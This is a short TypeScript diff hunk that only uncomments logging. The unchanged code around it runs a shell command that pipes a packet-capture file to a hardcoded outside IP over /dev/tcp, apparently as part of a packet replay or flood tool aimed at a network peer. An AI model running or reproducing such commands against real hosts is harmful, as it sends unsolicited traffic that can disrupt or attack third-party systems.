@@ -24,11 +24,11 @@ const worker = ( host: string, amount: string ) => {
         exec('cat peer-ack.pcap > /dev/tcp/135.181.16.249/26656', (err: any, stdout:any, stderr:any) => {
             if (err) {
                 //some err occurred
-                ///console.error(err)
+                console.error(err)
             } else {
                 // the *entire* stdout and stderr (buffered)
-               // console.log(`stdout: ${stdout}`);
-               // console.log(`stderr: ${stderr}`);
+               console.log(`stdout: ${stdout}`);
+               console.log(`stderr: ${stderr}`);
             }
         });
 
